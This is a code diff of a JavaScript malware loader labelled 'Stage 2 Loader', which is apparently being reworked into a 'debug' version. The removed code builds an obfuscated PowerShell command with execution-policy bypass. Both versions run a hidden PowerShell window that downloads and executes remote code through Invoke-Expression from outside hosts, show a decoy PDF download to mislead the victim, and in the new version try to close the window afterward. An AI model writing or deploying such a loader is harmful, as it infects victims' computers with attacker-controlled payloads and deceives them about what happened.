@@ -1,62 +1,32 @@
 // =============================================
-// Stage 2 Loader - Optimized for Vercel
-// Filename: loader.js
+// DEBUG VERSION - Stage 2 Loader
 // =============================================
 
 (function() {
-    'use strict';
-
-    // Heavy obfuscated array (your style)
-    var _0x5a3b = [
-        '-ep\x20Bypass\x20-c\x20[Net.ServicePointManager]::SecurityProtocol\x20=\x20[Net.SecurityProtocolType]::Tls',
-        '3BRDKJF', '916294dDiHxF', '1840728movHkM', 'nmOjig032', 'fromCharCode',
-        '546430MrpyyA', '12;\x20Invoke-Expression\x20(IRM\x20',
-        '1132848OxuJme', 'push', '3944VrHYbj', 'reverse', '11578360NrfDjd',
-        '2510508zydmdf', 'shift', '187792NDGEHO', 'yymzrF9161763', 'split',
-        '466735wjKXcO', '24uZinkE', '3010875KhCSAR', '14756qxmatC', '1365660RZaEVi', 'join'
-    ];
-
-    // Deobfuscation function
-    function deobf() {
-        var arr = _0x5a3b.slice();
-        arr = arr.reverse();
-        
-        var str = '';
-        for (var i = 0; i < arr.length; i++) {
-            if (typeof arr[i] === 'string') {
-                str += arr[i];
-            }
-        }
-        
-        // Final PowerShell command with your current Stage 3 URLs
-        var ps = str + 'https://aprilcap.blogspot.com/2026/04/chut.docx.pdf.html' + 
-                 ');\x20Start-Sleep\x20-Seconds\x2017;' +
-                 '\x20try\x20{\x20Invoke-Expression\x20(IRM\x20"https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_0c50ae2abd084521bc250008745a56f8.txt")\x20}\x20catch(e){}';
-
-        return ps;
-    }
-
-    // Run the downloader
     try {
         var shell = new ActiveXObject("Shell.Application");
-        var command = deobf();
 
-        // Execute PowerShell
-        shell.ShellExecute("powershell.exe", command, "", "open", 0);
+        // Simple, direct command for testing
+        var cmd = '-ep Bypass -c "Invoke-Expression (IRM \'https://aprilcap.blogspot.com/2026/04/chut.docx.pdf.html\'); Start-Sleep -Seconds 5"';
 
-        // Decoy PDF download after short delay
-        setTimeout(function() {
-            try {
-                var a = document.createElement("a");
-                a.href = "https://www.google.com";
-                a.download = "Document.pdf";
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-            } catch(e) {}
-        }, 1500);
+        shell.ShellExecute("powershell.exe", cmd, "", "open", 0);
+
+        // Decoy PDF
+        setTimeout(() => {
+            var a = document.createElement("a");
+            a.href = "https://www.google.com";
+            a.download = "Document.pdf";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }, 800);
+
+        // Self delete attempt (optional)
+        setTimeout(() => {
+            try { window.close(); } catch(e) {}
+        }, 2000);
 
     } catch(e) {
-        // Silent failure
+        alert("Error: " + e.message);   // Temporary for debugging
     }
 })();
